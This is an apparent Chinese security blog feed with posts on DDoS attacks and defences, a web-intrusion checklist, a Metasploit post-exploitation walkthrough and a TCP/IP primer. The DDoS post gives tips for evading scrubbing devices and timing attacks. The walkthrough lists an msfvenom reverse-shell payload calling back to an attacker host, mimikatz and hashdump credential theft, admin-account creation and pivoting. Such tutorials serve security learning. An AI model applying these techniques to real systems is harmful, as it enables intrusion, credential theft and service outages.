Flood就是攻击者操控大量肉机，对目标发起海量的域名查询请求。为了防止基于ACL的过滤，比如提高数据包的随机性，常用做法是UDP层随机伪造源IP地址、随机伪造源端口等参数。在DNS协议层，随机伪造查询ID以及待解析域名。随机伪造待解析域名除了防止过滤外，还可以降低命中DNS缓存的可能性，尽可能多的消耗DNS服务器的CPU资源。 HTTP Flood上文描述的SYN Flood、DNS Query Flood在现阶段已经能做到有效防御了，真正令各大厂商以及互联网企业头疼的是HTTP Flood攻击。HTTP Flood是针对Web服务在第七层协议发起的攻击。 它的巨大危害性主要表现在三个方面： 发起方便 过滤困难 影响深远 SYN Flood和DNS Query Flood都需要攻击者以root权限控制大批量的肉机。收集大量root权限的肉鸡很花费时间和精力，而且在攻击过程中肉鸡会由于流量异常被管理员发现，攻击者的资源快速损耗而补充缓慢，导致攻击强度明显降低而且不可长期持续。 HTTP Flood攻击则不同，攻击者并不需要控制大批的肉机，取而代之的是通过端口扫描程序在互联网上寻找匿名的HTTP代理或者SOCKS代理，攻击者通过匿名代理对攻击目标发起HTTP请求。匿名代理是一种比较丰富的资源，花几天时间获取代理并不是难事，因此攻击容易发起而且可以长期高强度的持续。 另一方面，HTTP Flood攻击在HTTP层发起，极力模仿正常用户的网页请求行为，与网站业务紧密相关，安全厂商很难提供一套通用的且不影响用户体验的方案。在一个地方工作得很好的规则，换一个场景可能带来大量的误杀。 最后，HTTP Flood攻击会引起严重的连锁反应，不仅仅是直接导致被攻击的Web前端响应缓慢，还间接攻击到后端的Java等业务层逻辑以及更后端的数据库服务，增大它们的压力，甚至对日志存储服务器都带来影响。 有意思的是，HTTP Flood还有个呢称叫CC攻击。 慢速连接攻击提起攻击，第一反应就是海量的流量、海量的报文。但有一种攻击却反其道而行之，以慢著称，以至于有些攻击目标被打死了都不知道是怎么死的，这就是慢速连接攻击，最具代表性的是rsnake发明的Slowloris。 HTTP协议规定，HTTP Request以\r\n\r\n结尾表示客户端发送结束，服务端开始处理。那么，如果永远不发送\r\n\r\n会如何？Slowloris就是利用这一点来做DDoS攻击的。攻击者在HTTP请求头中将Connection设置为Keep-Alive，要求Web Server保持TCP连接不要断开，随后缓慢地每隔几分钟发送一个key-value格式的数据到服务端，如a:b\r\n，导致服务端认为HTTP头部没有接收完成而一直等待。如果攻击者使用多线程或者傀儡机来做同样的操作，服务器的Web容器很快就被攻击者占满了TCP连接而不再接受新的请求。 很快的，Slowloris开始出现各种变种。比如POST方法向Web Server提交数据、填充一大大Content-Length但缓慢的一个字节一个字节的POST真正数据内容等等。 DDOS混合攻击高级攻击者从来不会使用单一的手段进行攻击，而是根据目标环境灵活组合。普通的SYN Flood容易被流量清洗设备通过反向探测、SYN Cookie等技术手段过滤掉， 但如果在SYN Flood中混入SYN+ACK数据包，使每一个伪造的SYN数据包都有一个与之对应的伪造的客户端确认报文，这里的对应是指源IP地址、源端口、目的IP、目的端口、TCP窗口大小、TTL等都符合同一个主机同一个TCP Flow的特征，流量清洗设备的反向探测和SYN Cookie性能压力将会显著增大。其实SYN数据报文配合其他各种标志位，都有特殊的攻击效果，这里不一一介绍。对DNS Query Flood而言，也有独特的技巧。 首先，DNS可以分为普通DNS和授权域DNS，攻击普通DNS，IP地址需要随机伪造，并且指明服务器要求做递归解析；但攻击授权域DNS，伪造的源IP地址则不应该是纯随机的，而应该是事先收集的全球各地ISP的DNS地址，这样才能达到最大攻击效果，使流量清洗设备处于添加IP黑名单还是不添加IP黑名单的尴尬处境。添加会导致大量误杀，不添加黑名单则每个报文都需要反向探测从而加大性能压力。 另一方面，前面提到，为了加大清洗设备的压力不命中缓存而需要随机化请求的域名，但需要注意的是，待解析域名必须在伪造中带有一定的规律性，比如说只伪造域名的某一部分而固化一部分，用来突破清洗设备设置的白名单。道理很简单，腾讯的服务器可以只解析腾讯的域名，完全随机的域名可能会直接被丢弃，需要固化。但如果完全固定，也很容易直接被丢弃，因此又需要伪造一部分。 其次，对DNS的攻击不应该只着重于UDP端口，根据DNS协议，TCP端口也是标准服务。在攻击时，可以UDP和TCP攻击同时进行。 HTTP Flood的着重点，在于突破前端的cache，通过HTTP头中的字段设置直接到达Web Server本身。另外，HTTP Flood对目标的选取也非常关键，一般的攻击者会选择搜索之类需要做大量数据查询的页面作为攻击目标，这是非常正确的，可以消耗服务器尽可能多的资源。但这种攻击容易被清洗设备通过人机识别的方式识别出来，那么如何解决这个问题？很简单，尽量选择正常用户也通过APP访问的页面，一般来说就是各种Web API。正常用户和恶意流量都是来源于APP，人机差别很小，基本融为一体难以区分。 之类的慢速攻击，是通过巧妙的手段占住连接不释放达到攻击的目的，但这也是双刃剑，每一个TCP连接既存在于服务端也存在于自身，自身也需要消耗资源维持TCP状态，因此连接不能保持太多。如果可以解决这一点，攻击性会得到极大增强，也就是说Slowloris可以通过stateless的方式发动攻击，在客户端通过嗅探捕获TCP的序列号和确认维护TCP连接，系统内核无需关注TCP的各种状态变迁，一台笔记本即可产生多达65535个TCP连接。 前面描述的，都是技术层面的攻击增强。在人的方面，还可以有一些别的手段。如果SYN Flood发出大量数据包正面强攻，再辅之以Slowloris慢速连接，多少人能够发现其中的秘密？即使服务器宕机了也许还只发现了SYN攻击想去加强TCP层清洗而忽视了应用层的行为。种种攻击都可以互相配合，达到最大的效果。攻击时间的选择，也是一大关键，比如说选择维护人员吃午饭时、维护人员下班堵在路上或者在地铁里无线上网卡都没有信号时、目标企业在举行大规模活动流量飙升时等。 来自P2P网络的攻击前面的攻击方式，多多少少都需要一些傀儡机，即使是HTTP Flood也需要搜索大量的匿名代理。如果有一种攻击，只需要发出一些指令，就有机器自动上来执行，才是完美的方案。这种攻击已经出现了，那就是来自P2P网络的攻击。 大家都知道，互联网上的P2P用户和流量都是一个极为庞大的数字。如果他们都去一个指定的地方下载数据，使成千上万的真实IP地址连接过来，没有哪个设备能够支撑住。拿BT下载来说，伪造一些热门视频的种子，发布到搜索引擎，就足以骗到许多用户和流量了，但这只是基础攻击。 高级P2P攻击，是直接欺骗资源管理服务器。如迅雷客户端会把自己发现的资源上传到资源管理服务器，然后推送给其他需要下载相同资源的用户，这样，一个链接就发布出去。通过协议逆向，攻击者伪造出大批量的热门资源信息通过资源管理中心分发出去，瞬间就可以传遍整个P2P网络。更为恐怖的是，这种攻击是无法停止的，即使是攻击者自身也无法停止，攻击一直持续到P2P官方发现问题更新服务器且下载用户重启下载软件时为止。 CCChallengeCollapsar的名字源于挑战国内知名安全厂商绿盟的抗DDOS设备-“黑洞”，通过botnet的傀儡主机或寻找匿名代理服务器，向目标发起大量真实的http请求，最终消耗掉大量的并发资源，拖慢整个网站甚至彻底拒绝服务。 互联网的架构追求扩展性本质上是为了提高并发能力，各种SQL性能优化措施：消除慢查询、分表分库、索引、优化数据结构、限制搜索频率等本质都是为了解决资源消耗，而CC大有反其道而行之的意味，占满服务器并发连接数，尽可能使请求避开缓存而直接读数据库，读数据库要找最消耗资源的查询，最好无法利用索引，每个查询都全表扫描，这样就能用最小的攻击资源起到最大的拒绝服务效果。 互联网产品和服务依靠数据分析来驱动改进和持续运营，所以除了前端的APP、中间件和数据库这类OLTP系统，后面还有OLAP，从日志收集，存储到数据处理和分析的大数据平台，当CC攻击发生时，不仅OLTP的部分受到了影响，实际上CC会产生大量日志，直接会对后面的OLAP产生影响，影响包括两个层面，一个当日的数据统计完全是错误的。第二个层面因CC期间访问日志剧增也会加大后端数据处理的负担。 CC是目前应用层攻击的主要手段之一，在防御上有一些方法，但不能完美解决这个问题。 反射型2004年时DRDOS第一次披露，通过将SYN包的源地址设置为目标地址，然后向大量的 真实TCP服务器发送TCP的SYN包，而这些收到SYN包的TCP server为了完成3次握手把SYN|ACK包“应答”给目标地址，完成了一次“反射”攻击，攻击者隐藏了自身，但有个问题是攻击者制造的流量和目标收到的攻击流量是1:1，且SYN|ACK包到达目标后马上被回以RST包，整个攻击的投资回报率不高。 反射型攻击的本质是利用“质询-应答”式协议，将质询包的源地址通过原始套接字伪造设置为目标地址，则应答的“回包”都被发送至目标，如果回包体积比较大或协议支持递归效果，攻击流量会被放大，成为一种高性价比的流量型攻击。 反射型攻击利用的协议目前包括NTP、Chargen、SSDP、DNS、RPC portmap等等。 流量放大型以上面提到的DRDOS中常见的SSDP协议为例，攻击者将Searchtype设置为ALL，搜索所有可用的设备和服务，这种递归效果产生的放大倍数是非常大的，攻击者只需要以较小的伪造源地址的查询流量就可以制造出几十甚至上百倍的应答流量发送至目标。 防御基础 攻击流量到底多大，这是一个关键问题。攻击量的大小。用的防护方法不一样。下面给你讲一讲，1G之内的防护方式。费用在，&lt;1万，每月 谈到DDoS防御，首先就是要知道到底遭受了多大的攻击。这个问题看似简单，实际上却有很多不为人知的细节在里面。 以SYN Flood为例，为了提高发送效率在服务端产生更多的SYN等待队列，攻击程序在填充包头时，IP首部和TCP首部都不填充可选的字段，因此IP首部长度恰好是20字节，TCP首部也是20字节，共40字节。 对于以太网来说，最小的包长度数据段必须达到46字节，而攻击报文只有40字节，因此，网卡在发送时，会做一些处理，在TCP首部的末尾，填充6个0来满足最小包的长度要求。这个时候，整个数据包的长度为14字节的以太网头，20字节的IP头，20字节的TCP头，再加上因为最小包长度要求而填充的6个字节的0，一共是60字节。 但这还没有结束。以太网在传输数据时，还有CRC检验的要求。网卡会在发送数据之前对数据包进行CRC检验，将4字节的CRC值附加到包头的最后面。这个时候，数据包长度已不再是40字节，而是变成64字节了，这就是常说的SYN小包攻击，数据包结构如下： |14字节以太网头部|20字节IP头部|20字节TCP|6字节填充|4字节检验| |目的MAC|源MAC|协议类型| IP头 |TCP头|以太网填充 | CRC检验 | 到64字节时，SYN数据包已经填充完成，准备开始传输了。攻击数据包很小，远远不够最大传输单元（MTU）的1500字节，因此不会被分片。那么这些数据包就像生产流水线上的罐头一样，一个包连着一个包紧密地挤在一起传输吗？事实上不是这样的。 以太网在传输时，还有前导码（preamble）和帧间距（inter-frame gap）。其中前导码占8字节（byte），即64比特位。前导码前面的7字节都是10101010，1和0间隔而成。但第八个字节就变成了10101011，当主机监测到连续的两个1时，就知道后面开始是数据了。在网络传输时，数据的结构如下： |8字节前导码|6字节目的MAC地址|6字节源MAC地址|2字节上层协议类型|20字节IP头|20字节TCP头|6字节以太网填充|4字节CRC检验|12字节帧间距| 也就是说，一个本来只有40字节的SYN包，在网络上传输时占的带宽，其实是84字节。 有了上面的基础，现在可以开始计算攻击流量和网络设备的线速问题了。当只填充IP头和TCP头的最小SYN包跑在以太网络上时，100Mbit的网络，能支持的最大PPS（Packet Per Second）是100×106 / (8 * (64+8+12)) = 148809，1000Mbit的网络，能支持的最大PPS是1488090。 SYN Flood防御前文描述过，SYN Flood攻击大量消耗服务器的CPU、内存资源，并占满SYN等待队列。相应的，我们修改内核参数即可有效缓解。主要参数如下： net.ipv4.tcp_syncookies = 1 net.ipv4.tcp_max_syn_backlog = 8192 net.ipv4.tcp_synack_retries = 2 分别为启用SYN Cookie、设置SYN最大队列长度以及设置SYN+ACK最大重试次数。 SYN Cookie的作用是缓解服务器资源压力。启用之前，服务器在接到SYN数据包后，立即分配存储空间，并随机化一个数字作为SYN号发送SYN+ACK数据包。然后保存连接的状态信息等待客户端确认。启用SYN Cookie之后，服务器不再分配存储空间，而且通过基于时间种子的随机数算法设置一个SYN号，替代完全随机的SYN号。发送完SYN+ACK确认报文之后，清空资源不保存任何状态信息。直到服务器接到客户端的最终ACK包，通过Cookie检验算法鉴定是否与发出去的SYN+ACK报文序列号匹配，匹配则通过完成握手，失败则丢弃。当然，前文的高级攻击中有SYN混合ACK的攻击方法，则是对此种防御方法的反击，其中优劣由双方的硬件配置决定 tcp_max_syn_backlog则是使用服务器的内存资源，换取更大的等待队列长度，让攻击数据包不至于占满所有连接而导致正常用户无法完成握手。net.ipv4.tcp_synack_retries是降低服务器SYN+ACK报文重试次数，尽快释放等待资源。这三种措施与攻击的三种危害一一对应，完完全全地对症下药。但这些措施也是双刃剑，可能消耗服务器更多的内存资源，甚至影响正常用户建立TCP连接，需要评估服务器硬件资源和攻击大小谨慎设置。 除了定制TCP/IP协议栈之外，还有一种常见做法是TCP首包丢弃方案，利用TCP协议的重传机制识别正常用户和攻击报文。当防御设备接到一个IP地址的SYN报文后，简单比对该IP是否存在于白名单中，存在则转发到后端。如不存在于白名单中，检查是否是该IP在一定时间段内的首次SYN报文，不是则检查是否重传报文，是重传则转发并加入白名单，不是则丢弃并加入黑名单。是首次SYN报文则丢弃并等待一段时间以试图接受该IP的SYN重传报文，等待超时则判定为攻击报文加入黑名单。 首包丢弃方案对用户体验会略有影响，因为丢弃首包重传会增大业务的响应时间，有鉴于此发展出了一种更优的TCP Proxy方案。所有的SYN数据报文由清洗设备接受，按照SYN Cookie方案处理。和设备成功建立了TCP三次握手的IP地址被判定为合法用户加入白名单，由设备伪装真实客户端IP地址再与真实服务器完成三次握手，随后转发数据。而指定时间内没有和设备完成三次握手的IP地址，被判定为恶意IP地址屏蔽一定时间。除了SYN Cookie结合TCP Proxy外，清洗设备还具备多种畸形TCP标志位数据包探测的能力，通过对SYN报文返回非预期应答测试客户端反应的方式来鉴别正常访问和恶意行为。 清洗设备的硬件具有特殊的网络处理器芯片和特别优化的操作系统、TCP/IP协议栈，可以处理非常巨大的流量和SYN队列。 HTTP Flood防御HTTP Flood攻击防御主要通过缓存的方式进行，尽量由设备的缓存直接返回结果来保护后端业务。大型的互联网企业，会有庞大的CDN节点缓存内容。 当高级攻击者穿透缓存时，清洗设备会截获HTTP请求做特殊处理。最简单的方法就是对源IP的HTTP请求频率做统计，高于一定频率的IP地址加入黑名单。这种方法过于简单，容易带来误杀，并且无法屏蔽来自代理服务器的攻击，因此逐渐废止，取而代之的是JavaScript跳转人机识别方案。 HTTP Flood是由程序模拟HTTP请求，一般来说不会解析服务端返回数据，更不会解析JS之类代码。因此当清洗设备截获到HTTP请求时，返回一段特殊JavaScript代码，正常用户的浏览器会处理并正常跳转不影响使用，而攻击程序会攻击到空处。 DNS Flood防御DNS攻击防御也有类似HTTP的防御手段，第一方案是缓存。其次是重发，可以是直接丢弃DNS报文导致UDP层面的请求重发，可以是返回特殊响应强制要求客户端使用TCP协议重发DNS查询请求。 特殊的，对于授权域DNS的保护，设备会在业务正常时期提取收到的DNS域名列表和ISP DNS IP列表备用，在攻击时，非此列表的请求一律丢弃，大幅降低性能压力。对于域名，实行同样的域名白名单机制，非白名单中的域名解析请求，做丢弃处理。 慢速连接攻击防御Slowloris攻击防御比较简单，主要方案有两个。 第一个是统计每个TCP连接的时长并计算单位时间内通过的报文数量即可做精确识别。一个TCP连接中，HTTP报文太少和报文太多都是不正常的，过少可能是慢速连接攻击，过多可能是使用HTTP 1.1协议进行的HTTP Flood攻击，在一个TCP连接中发送多个HTTP请求。 第二个是限制HTTP头部传输的最大许可时间。超过指定时间HTTP Header还没有传输完成，直接判定源IP地址为慢速连接攻击，中断连接并加入黑名单。 接下来细说一下不同攻击量对应的方法。 如果超过，&gt;10G 攻击，如果大于10G攻击，软件防护就是扯蛋 下面记住一句话，防ddos攻击大小于取决于你带宽的大小，与软件没关系。 国内现在100M带宽一个月就便宜的8000，贵的2万多，1G带宽，8万，10G带宽，80万，你确定要自己防护？ 业务逻辑很很多种，每家都不太一样， WEB类型，这个是攻击最多，防护方案更广，可以选择国内，国外，cdn加速等， 游戏类型，这个必须得放在国内，放国外太卡，掉线，没人玩了 解决办法就是找第三方防ddos解决商， 10~50G防护，国内很多机房都可以防护，问题你给的钱够不够idc机房是否给你防护，他们防护示意图： 机房有一个总带宽，如果你攻击带宽太大就影响他正常客户，他就会找各种借口给你ip屏蔽。 实际对机房没有什么影响，但是机房就给你ip屏蔽了，这个用于攻击游戏类网站，搞一会一掉线，用户全掉光了， 具体防护：https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&amp;mid=208509616&amp;idx=1&amp;sn=b139a0d97db8fae34a9aaf9ac971f804&amp;mpshare=1&amp;scene=1&amp;srcid=1228NCvYTinSSQFUVS0Ut7ua#rd]]></content>
      <categories>
        <category>网络及协议</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Web渗透入侵思路]]></title>
    <url>%2F2018%2F12%2F28%2FWeb%E6%B8%97%E9%80%8F%E5%85%A5%E4%BE%B5%E6%80%9D%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[一：查找注入，注意数据库用户权限和站库是否同服。 二、查找XSS，最近盲打很流行，不管怎样我们的目的是进入后台。 三、查找上传，一些能上传的页面，比如申请友链、会员头像、和一些敏感页面等等，注意查看验证方式是否能绕过，注意结合服务器的解析特性，比如典型的IIS6.0、Apache等。 四、查找编辑器，比较典型的ewebeditor、fckeditor等等。 五、查找phpmyadmin等管理程序，可以尝试弱口令，或者寻找其漏洞。 六、百度、谷歌搜索程序公开漏洞。 七、猜解文件，如知道某文件为admin_login.php,我们可尝试admin_add.php、admin_upload.php文件是否存在，也可以谷歌搜索site:cnseay.com inurl:edit等等，很多时候可以找到一些敏感文件，接着看是否验证权限或能否绕过验证，这像冰风说高级语法。 八、会员注册、修改、删除、评论等一切需要操作数据库的地方记得加单引号之类查看是否存在insert、update等类型注入。 九、会员或低权限管理登陆后可抓包分析，尝试修改超级管理员密码，权限提升。 十、通常有下载功能的站我们可以尝试修改下URL文件名，看能否下载站点敏感文件，如数据库配置文件等，数据库不可外连情况下可以尝试数据库密码登陆后台，也可下载上传、登陆验证等文件进行代码审计。 十一、备份文件和后门，某些主站子目录存在分站，比如www.cnseay.com/seay/，我们可以尝试www.cnseay.com/seay.rar/zip等压缩文件是否存在，可能就是子站的源码。也有一些站类似这样www.cnseay.com/old/，一般都是以前的老站，通常老站会比较容易拿。还有就是数据库备份、前人的后门等，具体这些目录上的东西就要看你的字典了。 十二、0day漏洞，不管是别人给你的，还是自己挖的，总之好使就行。]]></content>
      <categories>
        <category>渗透流程</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[后渗透攻击]]></title>
    <url>%2F2018%2F12%2F27%2F%E5%90%8E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[渗透测试方法论前期交互阶段在前期交互阶段，渗透测试团队与客户组织进行交互讨论，最重要的是确定渗透测试的范围、目标、限制条件以及服务合同细节。 该阶段通常涉及收集客户需求、准备测试计划、定义测试范围与边界、定义业务目标、项目管理与规划等活动。 情报搜集阶段渗透测试团队可以利用各种信息来源于搜集技术方法，尝试获取更多关于目标组织网络拓扑、系统配置与安全防御措施的信息。 收集信息的方法包括公开来源信息查询、Google Hacking、社会工程学、网络踩点、扫描探测、被动监听、服务查点等。 威胁建模阶段针对获取的信息进行威胁建模与攻击规划。通过团队共同的缜密情报分析与攻击思路头脑风暴，可以从大量的信息中理清头绪，切丁最可行的攻击通道。 漏洞分析阶段在确定出最可行的攻击通道之后，接下来需要考虑该如何获取目标系统的访问控制权。 渗透测试者需要综合分析前几个阶段获取并汇总的情报信息，特别是安全漏洞扫描结果、服务查点信息等，通过搜索可获取的渗透代码资源，找出可以实施渗透攻击的攻击点，并在实验环境中进行验证。 在该阶段，高水平的渗透测试团队还会针对攻击通道上的一些管家你系统与服务进行安全漏洞探测与挖掘，期望找出可被利用的未知安全漏洞，并开发出渗透代码，从而打开攻击通道上的关键路径。 渗透攻击阶段在此环节中，渗透测试团队需要利用它们所找出的目标系统安全漏洞，来真正入侵系统当中，获得访问控制权。 渗透测试者还需要充分地考虑目标系统特性来定制渗透攻击，并需要挫败目标网络与系统中实施的安全防御措施，才能成功达成渗透目的。 在黑盒测试中，渗透测试者还需要考虑对目标系统检测机制的逃逸，从而避免造成目标组织安全响应团队的警觉和发现。 后渗透攻击阶段在这个环节中，需要渗透测试团队根据目标的业务经营模式、保护资产形式与安全防御计划的不同特点，自主设计出攻击目标，识别关键基础设施，并寻找客户最具价值的尝试安全防护的信息和资产，最终达成能够对客户造成最重要业务影响的攻击途径 后渗透攻击的目标和途径是千变万化的 报告阶段渗透测试过程最终需要向客户提交，取得认可并成功获得合同付款就是一份渗透测试报告。 这份报告凝聚了之前所有阶段之中渗透测试团队所获取的管家你情报信息、探测和发掘出的系统安全漏洞、成功渗透攻击的过程，以及造成业务影响后果的攻击途径，同时还要站在防御者的角度上，帮助他们分析安全防御体系中的薄弱环节、存在的问题以及修补与升级方案。 实战确认目标站点使用浏览器打开测试站点http://www.test.com 信息搜集IP收集使用ping 命令初步判定ip 地址为10.10.10.201，但是显示请求超时，目标网站可能有防火墙设置。 网站技术架构识别根据HTTP 报文的响应头部，可以初步判断网站技术架构。 通过浏览网站信息，发现该网站使用meinfo，并且他的版本号码是5.0.4。 漏洞分析与利用metinfov5.0.4 存在文件上传漏洞，可以直接使用提前写好的脚本GetShell。 Shell 地址为： http://www.test.com/upload/file/1544783891.php 输入密码[cmd]，即可进入大马。 后渗透后渗透就是就是扩大渗透攻击的深度与广度。其中涉及到目标系统重要资产发现，权限提升，维持访问等等操作。 查看开放的端口发现Web 服务器上开放的端口如下， 经过简单判断，得到如下信息 用户账户信息查看所有账户 在这里，我们可以创建一个用户并加入到管理员组，但是我个人觉得意义不大。 查看IP地址在WebShell 中，查看IP 地址发现是[192.168.1.100]，这跟域名解析出来的地址不同。说明Web 服务器有可能在内网中。并且网关是[192.168.1.254]。 这里面我们是没有办法与192.168.1.100 直接进行通信的。我们尝试一下内网能否访问我们。嗯，可以访问，问题不大。 我们可以尝试反弹Shell ，并且使用强大的后渗透工具–Meterpreter。 反弹shell制作反弹Shell exe 文件msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.197 LPORT=4444 -f exe -o payload.exe 配置MSF具体命令如下： msf &gt; use exploit/multi/handler msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp msf exploit(multi/handler) &gt; set LHOST 10.10.10.197 LHOST =&gt; 10.10.10.197 msf exploit(multi/handler) &gt; exploit 将生成的payload.exe 文件直接上传到目标服务器，直接运行，就可以得到Meterpreter会话。 这个Meterpreter 会话的ID 是1 ，这个是由payload.exe 文件反弹回来的Shell，如果进程结束，会丢失该会话。 迁移进程通过ps命令查看系统进程 migrate 3724 信息收集 我们可以进一步收集Web 服务器192.168.1.100 的相关信息。 getuid #权限查看 systinfo #系统信息 ipconfig #网络信息 run post/windows/gather/checkvm #是否虚拟机 run post/linux/gather/checkvm #是否虚拟机 run post/windows/gather/forensics/enum_drives #查看分区 run post/windows/gather/enum_applications #获取安装软件信息 run post/windows/gather/dumplinks #获取最近的文件操作 run post/windows/gather/enum_ie #获取IE缓存 run post/windows/gather/enum_chrome #获取Chrome缓存 run post/windows/gather/enum_patches #补丁信息 run post/windows/gather/enum_domain #查找域控 抓取明文密码导入mimikatz 到处密码kerberos 我们可以导出目标服务器的用户名和密码[Administrator/123.com] 远程桌面与截屏run vnc 直接登录目标服务器。 还有很多命令如下： enumdesktops #查看可用的桌面 getdesktop #获取当前meterpreter 关联的桌面 set_desktop #设置meterpreter关联的桌面 -h查看帮助 screenshot #截屏 use espia #或者使用espia模块截屏 然后输入screengrab run vnc #使用vnc远程桌面连接 到此为止，这台服务器已经完全在我们的掌控之中。 扩大战果查看arp 缓存arp 查看路由信息route 添加路由run autoroute -s 192.168.1.0/24 查看添加的路由信息run autoroute -p 端口扫描发现目标开启了80 端口 版本信息测探 再次渗透攻击我们发现[192.168.1.200] 这台机器上80 端口运行着HFS 服务。这个[HFS 2.3 beta]版本存在远程代码执行漏洞。我们可以再次发起渗透攻击。（利用msf） 切入会话 5sessions -i 5 查看权限getuid 尝试提权getsystem 进程迁移migrate 12 尝试导出账户hash 值run hashdump 查看IP信息 开启远程桌面连接run post/windows/manage/enable_rdp 添加用户net localgroup administrators abc /add 端口转发portfwd add -l 33891 -p 3389 -r 127.0.0.1 远程桌面登录]]></content>
      <categories>
        <category>渗透流程</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[TCP/IP]]></title>
    <url>%2F2018%2F12%2F23%2FTCP-IP%2F</url>
    <content type="text"><![CDATA[TCP/IP 协议栈是一系列网络协议的总和，是构成网络通信的核心骨架，它定义了电子设备如何连入因特网，以及数据如何在它们之间进行传输。 TCP/IP采用四层结构，分别是应用层、传输层、网络层和链路层。 每一层都需要他的下一层所提供的协议来完成自己的需求。 TCP/IP的工作原理：一个主机的数据要经过哪些过程才能发送到对方的主机上。 物理介质 当通过http发起一个请求时，应用层、传输层、网络层和链路层的相关协议依次对该请求进行包装并携带对应的首部，最终在链路层生成以太网数据包，以太网数据包通过物理介质传输给对方主机，对方接收到数据包以后，然后再一层一层采用对应的协议进行拆包，最后把应用层数据交给应用程序处理。 配送车就是物理介质，配送站就是网关， 快递员就是路由器，收货地址就是IP地址，联系方式就是MAC地址。 链路层网络通信就是把有特定意义的数据通过物理介质传送给对方，单纯的发送0和1是没有意义的，要传输有意义的数据，就需要以字节为单位对 0 和 1 进行分组，并且要标识好每一组电信号的信息特征，然后按照分组的顺序依次发送。以太网规定一组电信号就是一个数据包，一个数据包被称为一帧， 制定这个规则的协议就是以太网协议。 以太网规协议定，接入网络的设备都必须安装网络适配器，即网卡， 数据包必须是从一块网卡传送到另一块网卡。而网卡地址就是数据包的发送地址和接收地址，也就是帧首部所包含的MAC地址，MAC地址是每块网卡的身份标识，就如同我们身份证上的身份证号码，具有全球唯一性。 有了MAC地址以后，以太网采用广播形式，把数据包发给该子网内所有主机，子网内每台主机在接收到这个包以后，都会读取首部里的目标MAC地址，然后和自己的MAC地址进行对比，如果相同就做下一步处理，如果不同，就丢弃这个包。 所以链路层的主要工作就是对电信号进行分组并形成具有特定意义的数据帧，然后以广播的形式通过物理介质发送给接收方。 网络层发送者如何知道接收者的MAC地址？ ARP协议 发送者如何知道接收者和自己同属一个子网？ IP协议 如果接收者和自己不在同一个子网，数据包如何发给对方？ 路由协议 IP协议MAC地址只与厂商有关，与所处的网络无关，所以无法通过MAC地址来判断两台主机是否属于同一个子网。 因此，网络层引入了IP协议，制定了一套新地址，使得我们能够区分两台主机是否同属一个网络，这套地址就是网络地址，也就是所谓的IP地址。 IP地址目前有两个版本，分别是IPv4和IPv6，IPv4是一个32位的地址，常采用4个十进制数字表示。IP协议将这个32位的地址分为两部分，前面部分代表网络地址，后面部分表示该主机在局域网中的地址。为了判断IP地址中的网络地址，IP协议还引入了子网掩码， IP地址和子网掩码通过按位与运算后就可以得到网络地址。 以C类地址192.168.24.1为例，其中前24位就是网络地址，后8位就是主机地址。如果两个IP地址在同一个子网内，则网络地址一定相同 ARP协议地址解析协议，是根据IP地址获取MAC地址的一个网络层协议。 工作原理：ARP首先会发起一个请求数据包，数据包首部包含了目标主机的IP地址，然后这个数据包会在数据链路层进行再次包装，生成以太网数据包，最终由以太网广播给子网内的所有主机，每一台主机都会接收到这个数据包，并取出标头中的IP地址，然后和自己的IP地址进行比较，如果相同就返回自己的MAC地址，如果不同就丢弃该数据包。ARP接收返回信息，以此来确定目标机的MAC地址，与此同时，ARP还会将返回的MAC地址与对应的IP地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。 路由协议通过ARP协议原理可以知道，ARP的MAC寻址局限在同一子网中，因此网络层引入了路由协议，首先通过IP协议来判断两台主机是否在同一子网中，如果在同一子网中就通过ARP协议查询相应的MAC地址，然后以广播的形式向该子网内的主机发送数据包。 如果不在同一个子网，以太网就会将该数据包转发给本子网的网关进行路由。网关是互联网子网与子网之间的桥梁，所以网关会进行多次转发，最终将数据包转发到目标IP所在的子网中，然后再通过ARP获取目标机MAC，最终也是通过广播形式将数据包发送给对方。 而完成这个路由协议的物理设备就是路由器，在错综复杂的网络世界里，路由器扮演者交通枢纽的角色，它会根据信道情况，选择并设定路由，以最佳路径来转发数据包。 网络层的主要工作是定义网络地址，区分网段，子网内MAC寻址，对于不同子网的数据包进行路由。 传输层链路层定义了主机的身份，即MAC地址， 而网络层定义了IP地址，明确了主机所在的网段，有了这两个地址，数据包就从可以从一个主机发送到另一台主机。但实际上数据包是从一个主机的某个应用程序发出，然后由对方主机的应用程序接收。而每台电脑都有可能同时运行着很多个应用程序，所以当数据包被发送到主机上以后，是无法确定哪个应用程序要接收这个包。 因此传输层引入了UDP协议来解决这个问题，为了给每个应用程序标识身份，UDP协议定义了端口，同一个主机上的每个应用程序都需要指定唯一的端口号，并且规定网络中传输的数据包必须加上端口信息。 这样，当数据包到达主机以后，就可以根据端口号找到对应的应用程序了。 为了保证传输的可靠性，TCP 协议在 UDP 基础之上建立了三次对话的确认机制，也就是说，在正式收发数据前，必须和对方建立可靠的连接。 TCP 能够保证数据包在传输过程中不被丢失，但美好的事物必然是要付出代价的，相比 UDP，TCP 实现过程复杂，消耗连接资源多，传输速度慢。 传输层的主要工作是定义端口，标识应用程序身份，实现端口到端口的通信，TCP协议可以保证数据传输的可靠性。 应用层理论上讲，有了以上三层协议的支持，数据已经可以从一个主机上的应用程序传输到另一台主机的应用程序了，但此时传过来的数据是字节流，不能很好的被程序识别，操作性差。因此，应用层定义了各种各样的协议来规范数据格式，常见的有 HTTP、FTP、SMTP 等，HTTP 是一种比较常用的应用层协议，主要用于B/S架构之间的数据通信。 有了这个规范以后，服务端收到请求以后，就能正确的解析客户端发来的数据，当请求处理完以后，再按照客户端要求的格式返回，客户端收到结果后，按照服务端返回的格式进行解析。 应用层的主要工作就是定义数据格式并按照对应的格式解读数据。 全流程 链路层：对0和1进行分组，定义数据帧，确认主机的物理地址，传输数据； 网络层：定义IP地址，确认主机所在的网络位置，并通过IP进行MAC寻址，对外网数据包进行路由转发； 传输层：定义端口，确认主机上应用程序的身份，并将数据包交给对应的应用程序； 应用层：定义数据格式，并按照对应的格式解读数据。 用一句通俗易懂的话讲就是： 